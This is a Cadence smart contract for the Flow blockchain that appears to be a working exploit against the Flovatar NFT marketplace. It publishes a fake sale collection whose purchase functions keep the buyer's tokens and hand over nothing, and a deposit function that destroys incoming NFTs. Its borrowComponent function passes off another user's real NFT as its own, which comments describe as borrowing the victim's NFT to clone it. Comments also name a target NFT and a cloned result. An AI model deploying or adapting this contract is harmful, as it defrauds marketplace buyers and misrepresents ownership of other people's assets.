import FlovatarMarketplace from "../0x921ea449dffec68a/FlovatarMarketplace.cdc"

import FlovatarComponent from "../0x921ea449dffec68a/FlovatarComponent.cdc"

import Flovatar from "../0x921ea449dffec68a/Flovatar.cdc"

import FlowToken from "./../../standardsV1/FlowToken.cdc"

import FungibleToken from "./../../standardsV1/FungibleToken.cdc"

import NonFungibleToken from "./../../standardsV1/NonFungibleToken.cdc"

import FlovatarComponentTemplate from "../0x921ea449dffec68a/FlovatarComponentTemplate.cdc"

access(all)
contract Marketplace{ 
	access(all)
	var userAddress: Address?
	
	access(all)
	var price: UFix64?
	
	access(all)
	var FlovatarComponentIDs: [UInt64]
	
	access(all)
	resource Collection: FlovatarMarketplace.SalePublic{ 
		access(all)
		fun purchaseFlovatar(tokenId: UInt64, recipientCap: Capability<&{Flovatar.CollectionPublic}>, buyTokens: @{FungibleToken.Vault}){ 
			let ref = Marketplace.account.storage.borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)!
			ref.deposit(from: <-buyTokens)
		}
		
		access(all)
		fun purchaseFlovatarComponent(tokenId: UInt64, recipientCap: Capability<&{FlovatarComponent.CollectionPublic}>, buyTokens: @{FungibleToken.Vault}){ 
			let ref = Marketplace.account.storage.borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)!
			ref.deposit(from: <-buyTokens)
		}
		
		access(all)
		fun getFlovatarPrice(tokenId: UInt64): UFix64?{ 
			return nil
		}
		
		// required
		access(all)
		fun getFlovatarComponentPrice(tokenId: UInt64): UFix64?{ 
			return Marketplace.price
		}
		
		access(all)
		fun getFlovatarIDs(): [UInt64]{ 
			return []
		}
		
		// required
		access(all)
		fun getFlovatarComponentIDs(): [UInt64]{ 
			return Marketplace.FlovatarComponentIDs
		}
		
		access(all)
		fun getFlovatar(tokenId: UInt64): &{Flovatar.Public}?{ 
			return nil
		}
		
		// required
		access(all)
		fun getFlovatarComponent(tokenId: UInt64): &{FlovatarComponent.Public}?{ 
			let ref = Marketplace.account.storage.borrow<&{FlovatarComponent.Public}>(from: /storage/peachTea)!
			return ref
		}
	}
	
	access(all)
	resource ComponentPublic: FlovatarComponent.Public{ 
		
		// required
		access(all)
		let templateId: UInt64
		
		// required
		access(all)
		let mint: UInt64
		
		access(all)
		let id: UInt64
		
		access(all)
		fun getTemplate(): FlovatarComponentTemplate.ComponentTemplateData{ 
			return FlovatarComponentTemplate.ComponentTemplateData(id: 0, name: "", category: "", color: "", description: "", svg: nil, series: 0, maxMintableComponents: 0, rarity: "")
		}
		
		access(all)
		fun getSvg(): String{ 
			return ""
		}
		
		access(all)
		fun getCategory(): String{ 
			return ""
		}
		
		access(all)
		fun getSeries(): UInt32{ 
			return 0
		}
		
		access(all)
		fun getRarity(): String{ 
			return ""
		}
		
		access(all)
		fun isBooster(rarity: String): Bool{ 
			return true
		}
		
		access(all)
		fun checkCategorySeries(category: String, series: UInt32): Bool{ 
			return true
		}
		
		access(all)
		let name: String
		
		access(all)
		let description: String
		
		access(all)
		let schema: String?
		
		init(templateId: UInt64, mint: UInt64){ 
			self.id = 0
			self.templateId = templateId // arbitrary value
			
			self.mint = mint // arbitrary value
			
			self.name = ""
			self.description = ""
			self.schema = nil
		}
	}
	
	access(account)
	fun createNewComponentPublic(templateId: UInt64, mint: UInt64){ 
		let old_res <- self.account.storage.load<@AnyResource>(from: /storage/peachTea)!
		destroy old_res
		let new_res <- create ComponentPublic(templateId: templateId, mint: mint)
		self.account.storage.save(<-new_res, to: /storage/peachTea)
	}
	
	access(all)
	resource ComponentResource: FlovatarComponent.CollectionPublic{ 
		access(all)
		fun deposit(token: @{NonFungibleToken.NFT}){ 
			destroy token
		}
		
		access(all)
		fun getIDs(): [UInt64]{ 
			return []
		}
		
		access(all)
		fun borrowNFT(id: UInt64): &{NonFungibleToken.NFT}{ 
			panic("todo")
		}
		
		// required
		access(all)
		fun borrowComponent(id: UInt64): &FlovatarComponent.NFT?{ 
			/*
						
						Although we cannot return arbitrary values here, we can "borrow" the victim's NFT to return the required value.
			
						This can be done by borrowing FlovatarComponent.CollectionPublicPath and gaining a resource reference that implements the CollectionPublic interface
			 
						// A.921ea449dffec68a.FlovatarComponent:243
			
						pub resource interface CollectionPublic {
							pub fun borrowComponent(id: UInt64): &FlovatarComponent.NFT? {
								// If the result isn't nil, the id of the returned reference
								// should be the same as the argument to the function
								post {
									(result == nil) || (result?.id == id):
										"Cannot borrow Component reference: The ID of the returned reference is incorrect"
								}
							}
						}
			
						We can then call borrowComponent to get the reference and return it
			
						A small hassle on the attacker side is they need to find out which user owns the NFT they want to replicate.
			
						*/
			
			let userAddress = getAccount(Marketplace.userAddress!)
			let collection_ref = userAddress.capabilities.get<&FlovatarComponent.Collection>(FlovatarComponent.CollectionPublicPath).borrow()!
			let nft_ref = collection_ref.borrowComponent(id: id)
			nft_ref! // confirm user has the nft we want
			
			return nft_ref
		}
	}
	
	// to update which user address we "borrow" the NFT from
	access(self)
	fun updateMarketplace(userAddress: Address?, price: UFix64?, FlovatarComponentIDs: [UInt64]){ 
		self.userAddress = userAddress
		self.price = price
		self.FlovatarComponentIDs = FlovatarComponentIDs
	}
	
	access(all)
	resource Admin{ 
		access(all)
		fun updatePrice(price: UFix64){ 
			Marketplace.price = price
		}
	}
	
	access(all)
	fun setupAdmin(){ 
		if self.account.storage.borrow<&Admin>(from: /storage/admin) == nil{ 
			self.account.storage.save(<-create Admin(), to: /storage/admin)
		}
	}
	
	init(){ 
		/*
				
				NFT to clone: https://flovatar.com/components/112502/0xc23d41bdf4e4587d
		
				Result: https://flovatar.com/components/112502/0x079960b40a947dbf
		
				*/
		
		self.userAddress = 0xc23d41bdf4e4587d
		self.price = 1337.0
		self.FlovatarComponentIDs = []
		self.account.storage.save(
			<-create ComponentPublic(templateId: 753, mint: 56),
			to: /storage/peachTea
		)
		self.account.storage.save(
			<-create Collection(),
			to: FlovatarMarketplace.CollectionStoragePath
		)
		var capability_1 =
			self.account.capabilities.storage.issue<&{FlovatarMarketplace.SalePublic}>(
				FlovatarMarketplace.CollectionStoragePath
			)
		self.account.capabilities.publish(
			capability_1,
			at: FlovatarMarketplace.CollectionPublicPath
		)
		self.account.storage.save(
			<-create ComponentResource(),
			to: FlovatarComponent.CollectionStoragePath
		)
		var capability_2 =
			self.account.capabilities.storage.issue<&{FlovatarComponent.CollectionPublic}>(
				FlovatarComponent.CollectionStoragePath
			)
		self.account.capabilities.publish(capability_2, at: FlovatarComponent.CollectionPublicPath)
		self.account.storage.save(<-create Admin(), to: /storage/admin)
	}
}
